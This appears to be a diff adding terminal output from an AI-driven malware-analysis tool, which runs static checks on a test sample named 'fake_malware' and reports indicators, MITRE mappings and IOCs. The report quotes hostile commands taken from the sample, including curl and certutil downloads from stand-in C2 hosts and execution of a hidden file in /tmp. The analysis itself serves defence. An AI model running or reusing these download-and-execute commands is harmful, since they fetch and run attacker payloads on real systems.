@@ -1,1 +1,120 @@
 analyst@86ae51db7aa9:/app$ pip install agno[google] && export GOOGLE_API_KEY=
+
+Output for samples/fake_malware:
+
+--- Starting Analysis for samples/fake_malware ---
+
+┏━ Message ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Perform a comprehensive security analysis on the binary file at: samples/fake_malware          ┃
+┃ Use each of your tools (extract_metadata, detect_crypto, analyze_strings, analyze_syscalls,    ┃
+┃ detect_obfuscation) and report findings based ONLY on the real tool outputs.                   ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+┏━ Tool Calls ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ • extract_metadata(file_path=samples/fake_malware)                                             ┃
+┃ • detect_crypto(file_path=samples/fake_malware)                                                ┃
+┃ • analyze_strings(file_path=samples/fake_malware)                                              ┃
+┃ • analyze_syscalls(file_path=samples/fake_malware)                                             ┃
+┃ • detect_obfuscation(file_path=samples/fake_malware)                                           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+┏━ Response (33.2s) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ COMPREHENSIVE SECURITY ANALYSIS REPORT: samples/fake_malware                                   ┃
+┃                                                                                                ┃
+┃ EXECUTIVE SUMMARY                                                                              ┃
+┃ The binary file at samples/fake_malware is a 64-bit ELF executable that exhibits multiple      ┃
+┃ indicators of malicious activity. Analysis reveals: cryptographic constants, numerous          ┃
+┃ suspicious strings (C2 URLs, IP addresses, shell commands, ransomware keywords, exfiltration  ┃
+┃ markers, keylogging indicators, and anti-analysis techniques), and UPX packer obfuscation.     ┃
+┃ Assessment: HIGH PROBABILITY OF MALWARE                                                        ┃
+┃                                                                                                ┃
+┃ KEY FINDINGS BY SEVERITY                                                                       ┃
+┃                                                                                                ┃
+┃ CRITICAL SEVERITY:                                                                             ┃
+┃ • Ransomware Keyword Detected: 'ransom'                                                         ┃
+┃   → Strong indicator of data encryption and extortion capabilities                              ┃
+┃                                                                                                ┃
+┃ HIGH SEVERITY:                                                                                 ┃
+┃ • Obfuscated PowerShell Command: 'powershell -enc ZQBjAGgAbwAgACIAcAB3AG4AZQBkACIA'            ┃
+┃   → Indicates execution of malicious scripts                                                    ┃
+┃ • Shell Command: 'chmod 777 /tmp/.hidden && /bin/sh /tmp/.hidden'                              ┃
+┃   → Common malware persistence and execution technique                                          ┃
+┃ • Keylogging Functionality Detected: 'keylog'                                                   ┃
+┃   → Designed to capture user keystrokes                                                         ┃
+┃ • Webcam Access Keyword: 'webcam'                                                               ┃
+┃   → Suggests surveillance capabilities                                                          ┃
+┃ • Data Exfiltration Indicator: 'exfiltrat'                                                      ┃
+┃   → Intent to steal data from the compromised system                                            ┃
+┃ • Shellcode Detected: 'shellcode'                                                               ┃
+┃   → Position-independent code for payload execution or process injection                        ┃
+┃ • Obfuscation: UPX Packer Byte Signature                                                        ┃
+┃   → Used to compress executable and evade detection                                             ┃
+┃                                                                                                ┃
+┃ MEDIUM SEVERITY:                                                                               ┃
+┃ • Cryptographic Implementations:                                                                ┃
+┃   → AES S-Box detected (encryption for C2, ransomware, or data protection)                      ┃
+┃   → AES RCON detected (AES key schedule operations)                                             ┃
+┃   → SHA-256 Init detected (integrity checks and key derivation)                                 ┃
+┃ • Command and Control Infrastructure:                                                           ┃
+┃   → http://185.233.100.42/stage2 -O /tmp/.update                                                ┃
+┃   → https://evil-c2-server.ru/gate.php                                                          ┃
+┃   → http://185.233.100.42/beacon                                                                ┃
+┃   → curl -s http://evil-c2-server.ru/payload.bin -o /tmp/.hidden                                ┃
+┃   → certutil -urlcache -split -f http://evil.com/mal.exe C:\\Users\\Public\\mal.exe            ┃
+┃ • Network Reconnaissance:                                                                       ┃
+┃   → Private IP addresses: 10.0.0.1, 192.168.1.100                                               ┃
+┃ • Data Exfiltration Target:                                                                     ┃
+┃   → \\FILESERVER\shared\exfil_data.zip (network share exfiltration)                            ┃
+┃ • Persistence Mechanism:                                                                        ┃
+┃   → HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run                           ┃
+┃   → Suggests automatic startup execution                                                        ┃
+┃ • Additional Suspicious Keywords:                                                               ┃
+┃   → 'encrypt', 'decrypt', 'password', 'screenshot', 'inject'                                    ┃
+┃   → 'anti-vm', 'sandbox' (virtualization evasion)                                                ┃
+┃                                                                                                ┃
+┃ LOW SEVERITY:                                                                                  ┃
+┃ • Ransom Contact: 'pay-bitcoin@darkmail.onion'                                                  ┃
+┃ • Obfuscated Configuration: Base64 blob                                                         ┃
+┃ • Windows System Paths: C:\Windows\System32\cmd.exe, C:\Users\Public\Documents\payload.exe      ┃
+┃ • Anti-Debugging Keywords: 'debug', 'vmware', 'virtualbox'                                      ┃
+┃                                                                                                ┃
+┃ MITRE ATT&CK MAPPING                                                                            ┃
+┃ • T1573.001 - Encrypted Channel: Symmetric Cryptography                                         ┃
+┃ • T1027 - Obfuscated Files or Information                                                       ┃
+┃ • T1027.002 - Software Packing                                                                  ┃
+┃ • T1071.001 - Application Layer Protocol: Web Protocols                                         ┃
+┃ • T1095 - Non-Application Layer Protocol (IP scanning)                                          ┃
+┃ • T1021.002 - Remote Services: SMB/Windows Admin Shares                                         ┃
+┃ • T1059 - Command and Scripting Interpreter                                                     ┃
+┃ • T1112 - Modify Registry                                                                       ┃
+┃ • T1486 - Data Encrypted for Impact                                                             ┃
+┃ • T1140 - Deobfuscate/Decode Files or Information                                               ┃
+┃ • T1555 - Credentials from Password Stores                                                      ┃
+┃ • T1056.001 - Input Capture: Keylogging                                                         ┃
+┃ • T1113 - Screen Capture                                                                        ┃
+┃ • T1125 - Video Capture                                                                         ┃
+┃ • T1041 - Exfiltration Over C2 Channel                                                          ┃
+┃ • T1055 - Process Injection                                                                     ┃
+┃ • T1622 - Debugger Evasion                                                                      ┃
+┃ • T1497 - Virtualization/Sandbox Evasion                                                        ┃
+┃ • T1497.001 - System Checks                                                                     ┃
+┃                                                                                                ┃
+┃ RISK ASSESSMENT                                                                                 ┃
+┃ Aggregated Risk Score: 100/100 (CRITICAL)                                                       ┃
+┃ • String Analysis: 100 (Critical threat indicators)                                             ┃
+┃ • Crypto Detection: 45 (Encryption capabilities)                                                ┃
+┃ • Obfuscation Detection: 30 (Known packer usage)                                                ┃
+┃ • Metadata Analysis: 0                                                                          ┃
+┃ • Syscall Analysis: 0                                                                           ┃
+┃                                                                                                ┃
+┃ RECOMMENDED ACTIONS                                                                             ┃
+┃ 1. Dynamic Sandbox Analysis - Execute in isolated environment to confirm runtime behavior       ┃
+┃ 2. Unpacking - Decompress UPX-packed binary for complete code review                            ┃
+┃ 3. Reverse Engineering - Analyze C2 protocols, exfiltration methods, and evasion techniques    ┃
+┃ 4. IOC Extraction & Blocking:                                                                   ┃
+┃    • IPs: 185.233.100.42                                                                        ┃
+┃    • Domains: evil-c2-server.ru, evil.com                                                       ┃
+┃    • Paths: /tmp/.update, /tmp/.hidden, C:\Users\Public\mal.exe                                 ┃
+┃ 5. Threat Hunting - Search for similar indicators across network                                ┃
+┃ 6. Incident Response - Prepare containment procedures for potential compromise                 ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
